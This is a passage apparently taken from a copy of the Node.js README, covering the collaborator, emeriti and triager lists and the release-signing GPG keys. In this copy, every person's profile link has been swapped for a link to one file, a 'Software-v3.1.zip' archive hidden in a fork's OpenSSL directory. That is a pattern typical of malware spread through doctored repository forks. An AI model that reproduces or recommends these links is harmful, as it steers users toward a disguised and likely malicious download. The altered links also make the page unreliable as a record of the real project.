* [MylesBorins](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Myles Borins** \<myles.borins@gmail.com> (he/him)
* [oyyd](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ouyang Yadong** \<oyydoibh@gmail.com> (he/him)
* [panva](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Filip Skokan** \<panva.ip@gmail.com>
* [PoojaDurgad](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Pooja D P** \<Pooja.D.P@ibm.com> (she/her)
* [puzpuzpuz](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Andrey Pechkurov** \<apechkurov@gmail.com> (he/him)
* [Qard](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Stephen Belanger** \<admin@stephenbelanger.com> (he/him)
* [RaisinTen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Darshan Sen** \<raisinten@gmail.com> (he/him)
* [rexagod](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Pranshu Srivastava** \<rexagod@gmail.com> (he/him)
* [richardlau](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Richard Lau** \<rlau@redhat.com>
* [rickyes](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ricky Zhou** \<0x19951125@gmail.com> (he/him)
* [ronag](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Robert Nagy** \<ronagy@icloud.com>
* [ruyadorno](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ruy Adorno** \<ruyadorno@github.com> (he/him)
* [rvagg](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Rod Vagg** \<rod@vagg.org>
* [ryzokuken](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ujjwal Sharma** \<ryzokuken@disroot.org> (he/him)
* [santigimeno](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Santiago Gimeno** \<santiago.gimeno@gmail.com>
* [seishun](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Nikolai Vavilov** \<vvnicholas@gmail.com>
* [shisama](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Masashi Hirano** \<shisama07@gmail.com> (he/him)
* [silverwind](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Roman Reiss** \<me@silverwind.io>
* [srl295](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Steven R Loomis** \<srloomis@us.ibm.com>
* [starkwang](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Weijia Wang** \<starkwang@126.com>
* [sxa](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Stewart X Addison** \<sxa@redhat.com> (he/him)
* [targos](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Michaël Zasso** \<targos@protonmail.com> (he/him)
* [TimothyGu](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Tiancheng "Timothy" Gu** \<timothygu99@gmail.com> (he/him)
* [tniessen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Tobias Nießen** \<tniessen@tnie.de> (he/him)
* [trivikr](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Trivikram Kamat** \<trivikr.dev@gmail.com>
* [Trott](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Rich Trott** \<rtrott@gmail.com> (he/him)
* [vdeturckheim](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Vladimir de Turckheim** \<vlad2t@hotmail.com> (he/him)
* [VoltrexMaster](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Voltrex** \<mohammadkeyvanzade94@gmail.com> (he/him)
* [watilde](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Daijiro Wachi** \<daijiro.wachi@gmail.com> (he/him)
* [watson](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Thomas Watson** \<w@tson.dk>
* [XadillaX](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Khaidi Chu** \<i@2333.moe> (he/him)
* [yashLadha](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Yash Ladha** \<yash@yashladha.in> (he/him)
* [yosuke-furukawa](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Yosuke Furukawa** \<yosuke.furukawa@gmail.com>
* [ZYSzys](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Yongsheng Zhang** \<zyszys98@gmail.com> (he/him)

<details>

<summary>Emeriti</summary>

<!-- find-inactive-collaborators.mjs depends on the format of the emeriti list.
     If the format changes, those utilities need to be tested and updated. -->

### Collaborator emeriti

* [andrasq](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Andras** \<andras@kinvey.com>
* [AnnaMag](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Anna M. Kedzierska** \<anna.m.kedzierska@gmail.com>
* [AndreasMadsen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Andreas Madsen** \<amwebdk@gmail.com> (he/him)
* [aqrln](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Alexey Orlenko** \<eaglexrlnk@gmail.com> (he/him)
* [bmeurer](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Benedikt Meurer** \<benedikt.meurer@gmail.com>
* [bnoordhuis](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ben Noordhuis** \<info@bnoordhuis.nl>
* [brendanashworth](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Brendan Ashworth** \<brendan.ashworth@me.com>
* [calvinmetcalf](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Calvin Metcalf** \<calvin.metcalf@gmail.com>
* [chrisdickinson](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Chris Dickinson** \<christopher.s.dickinson@gmail.com>
* [claudiorodriguez](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Claudio Rodriguez** \<cjrodr@yahoo.com>
* [DavidCai1993](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **David Cai** \<davidcai1993@yahoo.com> (he/him)
* [digitalinfinity](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Hitesh Kanwathirtha** \<digitalinfinity@gmail.com> (he/him)
* [eljefedelrodeodeljefe](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Robert Jefe Lindstaedt** \<robert.lindstaedt@gmail.com>
* [estliberitas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Alexander Makarenko** \<estliberitas@gmail.com>
* [firedfox](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Daniel Wang** \<wangyang0123@gmail.com>
* [Fishrock123](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Jeremiah Senkpiel** \<fishrock123@rocketmail.com> (he/they)
* [gdams](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **George Adams** \<gadams@microsoft.com> (he/him)
* [geek](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Wyatt Preul** \<wpreul@gmail.com>
* [gibfahn](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Gibson Fahnestock** \<gibfahn@gmail.com> (he/him)
* [glentiki](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Glen Keane** \<glenkeane.94@gmail.com> (he/him)
* [iarna](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Rebecca Turner** \<me@re-becca.org>
* [imran-iq](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Imran Iqbal** \<imran@imraniqbal.org>
* [imyller](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ilkka Myller** \<ilkka.myller@nodefield.com>
* [isaacs](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Isaac Z. Schlueter** \<i@izs.me>
* [italoacasas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Italo A. Casas** \<me@italoacasas.com> (he/him)
* [jasongin](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Jason Ginchereau** \<jasongin@microsoft.com>
* [jbergstroem](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Johan Bergström** \<bugs@bergstroem.nu>
* [jdalton](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **John-David Dalton** \<john.david.dalton@gmail.com>
* [jhamhader](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Yuval Brik** \<yuval@brik.org.il>
* [joshgav](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Josh Gavant** \<josh.gavant@outlook.com>
* [julianduque](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Julian Duque** \<julianduquej@gmail.com> (he/him)
* [kfarnung](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Kyle Farnung** \<kfarnung@microsoft.com> (he/him)
* [kunalspathak](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Kunal Pathak** \<kunal.pathak@microsoft.com>
* [lance](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Lance Ball** \<lball@redhat.com> (he/him)
* [lucamaraschi](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Luca Maraschi** \<luca.maraschi@gmail.com> (he/him)
* [lxe](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Aleksey Smolenchuk** \<lxe@lxe.co>
* [maclover7](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Jon Moss** \<me@jonathanmoss.me> (he/him)
* [matthewloring](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Matthew Loring** \<mattloring@google.com>
* [micnic](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Nicu Micleușanu** \<micnic90@gmail.com> (he/him)
* [mikeal](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Mikeal Rogers** \<mikeal.rogers@gmail.com>
* [misterdjules](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Julien Gilli** \<jgilli@netflix.com>
* [monsanto](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Christopher Monsanto** \<chris@monsan.to>
* [MoonBall](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Chen Gang** \<gangc.cxy@foxmail.com>
* [not-an-aardvark](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Teddy Katz** \<teddy.katz@gmail.com> (he/him)
* [ofrobots](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ali Ijaz Sheikh** \<ofrobots@google.com> (he/him)
* [Olegas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Oleg Elifantiev** \<oleg@elifantiev.ru>
* [orangemocha](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Alexis Campailla** \<orangemocha@nodejs.org>
* [othiym23](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Forrest L Norvell** \<ogd@aoaioxxysz.net> (they/them/themself)
* [petkaantonov](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Petka Antonov** \<petka_antonov@hotmail.com>
* [phillipj](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Phillip Johnsen** \<johphi@gmail.com>
* [piscisaureus](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Bert Belder** \<bertbelder@gmail.com>
* [pmq20](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Minqi Pan** \<pmq2001@gmail.com>
* [princejwesley](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Prince John Wesley** \<princejohnwesley@gmail.com>
* [psmarshall](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Peter Marshall** \<petermarshall@chromium.org> (he/him)
* [refack](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Refael Ackermann (רפאל פלחי)** \<refack@gmail.com> (he/him/הוא/אתה)
* [rlidwka](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Alex Kocharin** \<alex@kocharin.ru>
* [rmg](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ryan Graham** \<r.m.graham@gmail.com>
* [robertkowalski](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Robert Kowalski** \<rok@kowalski.gd>
* [romankl](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Roman Klauke** \<romaaan.git@gmail.com>
* [ronkorving](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ron Korving** \<ron@ronkorving.nl>
* [RReverser](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Ingvar Stepanyan** \<me@rreverser.com>
* [rubys](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Sam Ruby** \<rubys@intertwingly.net>
* [saghul](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Saúl Ibarra Corretgé** \<s@saghul.net>
* [sam-github](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Sam Roberts** \<vieuxtech@gmail.com>
* [sebdeckers](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Sebastiaan Deckers** \<sebdeckers83@gmail.com>
* [shigeki](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Shigeki Ohtsu** \<ohtsu@ohtsu.org> (he/him)
* [stefanmb](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Stefan Budeanu** \<stefan@budeanu.com>
* [tellnes](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Christian Tellnes** \<christian@tellnes.no>
* [thefourtheye](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Sakthipriyan Vairamani** \<thechargingvolcano@gmail.com> (he/him)
* [thlorenz](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Thorsten Lorenz** \<thlorenz@gmx.de>
* [trevnorris](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Trevor Norris** \<trev.norris@gmail.com>
* [tunniclm](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Mike Tunnicliffe** \<m.j.tunnicliffe@gmail.com>
* [vkurchatkin](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Vladimir Kurchatkin** \<vladimir.kurchatkin@gmail.com>
* [vsemozhetbyt](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Vse Mozhet Byt** \<vsemozhetbyt@gmail.com> (he/him)
* [whitlockjc](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Jeremy Whitlock** \<jwhitlock@apache.org>
* [yhwang](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Yihong Wang** \<yh.wang@ibm.com>
* [yorkie](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Yorkie Liu** \<yorkiefixer@gmail.com>

</details>
<!--lint enable prohibited-strings-->

Collaborators follow the [Collaborator Guide](./doc/guides/collaborator-guide.md) in
maintaining the Node.js project.

### Triagers

* [Ayase-252](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Qingyu Deng** \<i@ayase-lab.com>
* [himadriganguly](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Himadri Ganguly** \<himadri.tech@gmail.com> (he/him)
* [iam-frankqiu](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Frank Qiu** \<iam.frankqiu@gmail.com> (he/him)
* [marsonya](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Akhil Marsonya** \<akhil.marsonya27@gmail.com> (he/him)
* [Mesteery](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Mestery** \<mestery@pm.me>
* [PoojaDurgad](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Pooja Durgad** \<Pooja.D.P@ibm.com>
* [RaisinTen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Darshan Sen** \<raisinten@gmail.com>
* [VoltrexMaster](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
  **Voltrex** \<mohammadkeyvanzade94@gmail.com> (he/him)

### Release keys

Primary GPG keys for Node.js Releasers (some Releasers sign with subkeys):

* **Beth Griggs** \<bgriggs@redhat.com>
  `4ED778F539E3634C779C87C6D7062848A1AB005C`
* **Colin Ihrig** \<cjihrig@gmail.com>
  `94AE36675C464D64BAFA68DD7434390BDBE9B9C5`
* **Danielle Adams** \<adamzdanielle@gmail.com>
  `74F12602B6F1C4E913FAA37AD3A89613643B6201`
* **James M Snell** \<jasnell@keybase.io>
  `71DCFD284A79C3B38668286BC97EC7A07EDE3FC1`
* **Michaël Zasso** \<targos@protonmail.com>
  `8FCCA13FEF1D0C2E91008E09770F7A9A5AE15600`
* **Myles Borins** \<myles.borins@gmail.com>
  `C4F0DFFF4E8C1A8236409D08E73BC641CC11F4C8`
* **Richard Lau** \<rlau@redhat.com>
  `C82FA3AE1CBEDC6BE46B9360C43CEC45C17AB93C`
* **Rod Vagg** \<rod@vagg.org>
  `DD8F2338BAE7501E3DD5AC78C273792F7D83545D`
* **Ruben Bridgewater** \<ruben@bridgewater.de>
  `A48C2BEE680E841632CD4E44F07496B3EB3C1762`
* **Ruy Adorno** \<ruyadorno@hotmail.com>
  `108F52B48DB57BB0CC439B2997B01419BD92F80A`
* **Shelley Vohr** \<shelley.vohr@gmail.com>
  `B9E2F5981AA6E0CD28160D9FF13993A75599653C`

To import the full set of trusted release keys (including subkeys possibly used
to sign releases):

```bash
gpg --keyserver pool.sks-keyservers.net --recv-keys 4ED778F539E3634C779C87C6D7062848A1AB005C
gpg --keyserver pool.sks-keyservers.net --recv-keys 94AE36675C464D64BAFA68DD7434390BDBE9B9C5
gpg --keyserver pool.sks-keyservers.net --recv-keys 74F12602B6F1C4E913FAA37AD3A89613643B6201
gpg --keyserver pool.sks-keyservers.net --recv-keys 71DCFD284A79C3B38668286BC97EC7A07EDE3FC1
gpg --keyserver pool.sks-keyservers.net --recv-keys 8FCCA13FEF1D0C2E91008E09770F7A9A5AE15600
gpg --keyserver pool.sks-keyservers.net --recv-keys C4F0DFFF4E8C1A8236409D08E73BC641CC11F4C8
gpg --keyserver pool.sks-keyservers.net --recv-keys C82FA3AE1CBEDC6BE46B9360C43CEC45C17AB93C
gpg --keyserver pool.sks-keyservers.net --recv-keys DD8F2338BAE7501E3DD5AC78C273792F7D83545D
gpg --keyserver pool.sks-keyservers.net --recv-keys A48C2BEE680E841632CD4E44F07496B3EB3C1762
gpg --keyserver pool.sks-keyservers.net --recv-keys 108F52B48DB57BB0CC439B2997B01419BD92F80A
gpg --keyserver pool.sks-keyservers.net --recv-keys B9E2F5981AA6E0CD28160D9FF13993A75599653C
```

See the section above on [Verifying Binaries](#verifying-binaries) for how to
use these keys to verify a downloaded file.

<details>

<summary>Other keys used to sign some previous releases</summary>

* **Chris Dickinson** \<christopher.s.dickinson@gmail.com>
  `9554F04D7259F04124DE6B476D5A82AC7E37093B`
* **Danielle Adams** \<adamzdanielle@gmail.com>
  `1C050899334244A8AF75E53792EF661D867B9DFA`
